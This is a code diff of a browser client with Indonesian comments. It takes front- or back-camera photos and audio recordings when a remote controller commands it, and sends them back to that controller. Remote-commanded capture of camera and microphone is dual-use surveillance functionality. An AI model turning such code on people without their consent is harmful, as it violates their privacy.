@@ -374,7 +374,10 @@
         await sendNotification(command.message);
         break;
       case 'take_photo':
-        await takePhotoAndSend();
+        // TERIMA PARAMETER facingMode dari controller
+        const facingMode = command.facingMode || 'environment';
+        addLog(`📷 Perintah foto dengan kamera: ${facingMode === 'user' ? 'DEPAN' : 'BELAKANG'}`);
+        await takePhotoAndSend(facingMode);
         break;
       case 'start_record':
         await startRecording();
@@ -418,32 +421,85 @@
     }
   }
   
-  let currentStream = null;
-  async function takePhotoAndSend() {
-    addLog(`📷 Membuka kamera untuk foto...`);
+  // =============== AMBIL FOTO dengan FACING MODE (DIPERBAIKI) ===============
+  async function takePhotoAndSend(facingMode = 'environment') {
+    const modeName = facingMode === 'user' ? 'DEPAN (selfie)' : 'BELAKANG';
+    addLog(`📷 Membuka kamera ${modeName} untuk foto...`);
+    
     try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      // Coba dengan exact facingMode
+      const constraints = { 
+        video: { facingMode: { exact: facingMode } } 
+      };
+      const stream = await navigator.mediaDevices.getUserMedia(constraints);
+      
       const video = document.createElement('video');
       video.srcObject = stream;
       await video.play();
+      
+      // Tunggu sebentar agar kamera siap
       await new Promise(r => setTimeout(r, 500));
       
       const canvas = document.createElement('canvas');
       canvas.width = video.videoWidth || 640;
       canvas.height = video.videoHeight || 480;
-      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+      const ctx = canvas.getContext('2d');
+      
+      // Untuk kamera depan (user), terapkan mirror effect
+      if (facingMode === 'user') {
+        ctx.translate(canvas.width, 0);
+        ctx.scale(-1, 1);
+      }
+      
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
       
       const imageData = canvas.toDataURL('image/jpeg', 0.8);
       stream.getTracks().forEach(t => t.stop());
       
-      addLog(`✅ Foto berhasil diambil (${canvas.width}x${canvas.height})`);
-      sendResponse('photo', { image: imageData });
+      addLog(`✅ Foto ${modeName} berhasil diambil (${canvas.width}x${canvas.height})`);
+      sendResponse('photo', { image: imageData, facingMode: facingMode });
+      
     } catch (err) {
-      addLog(`❌ Gagal ambil foto: ${err.message}`, true);
-      sendResponse('photo', { error: err.message });
+      addLog(`❌ Gagal ambil foto dengan ${modeName}: ${err.message}`, true);
+      
+      // FALLBACK: coba tanpa exact
+      try {
+        addLog(`🔄 Mencoba fallback tanpa exact...`);
+        const fallbackStream = await navigator.mediaDevices.getUserMedia({ 
+          video: { facingMode: facingMode } 
+        });
+        
+        const video = document.createElement('video');
+        video.srcObject = fallbackStream;
+        await video.play();
+        await new Promise(r => setTimeout(r, 500));
+        
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        const ctx = canvas.getContext('2d');
+        
+        if (facingMode === 'user') {
+          ctx.translate(canvas.width, 0);
+          ctx.scale(-1, 1);
+        }
+        
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        
+        const imageData = canvas.toDataURL('image/jpeg', 0.8);
+        fallbackStream.getTracks().forEach(t => t.stop());
+        
+        addLog(`✅ Foto ${modeName} berhasil (fallback)`);
+        sendResponse('photo', { image: imageData, facingMode: facingMode });
+        
+      } catch (e2) {
+        addLog(`❌ Gagal total ambil foto: ${e2.message}`, true);
+        sendResponse('photo', { error: e2.message });
+      }
     }
   }
   
+  // =============== REKAM SUARA ===============
   let mediaRecorder = null;
   let audioChunks = [];
   
@@ -467,9 +523,12 @@
       };
       
       mediaRecorder.start();
-      addLog(`🎙️ Merekam... (akan stop dalam 15 detik)`);
+      addLog(`🎙️ Merekam... (akan stop dalam 15 detik atau manual dari controller)`);
+      
+      // Auto stop setelah 15 detik
       setTimeout(() => {
         if (mediaRecorder && mediaRecorder.state === 'recording') {
+          addLog(`⏰ Auto-stop setelah 15 detik`);
           mediaRecorder.stop();
         }
       }, 15000);
@@ -484,7 +543,7 @@
   async function stopRecordingAndSend() {
     if (mediaRecorder && mediaRecorder.state === 'recording') {
       mediaRecorder.stop();
-      addLog(`⏹️ Menghentikan rekaman`);
+      addLog(`⏹️ Menghentikan rekaman dan mengirim hasil`);
     } else {
       addLog(`⚠️ Tidak ada rekaman aktif`, true);
     }
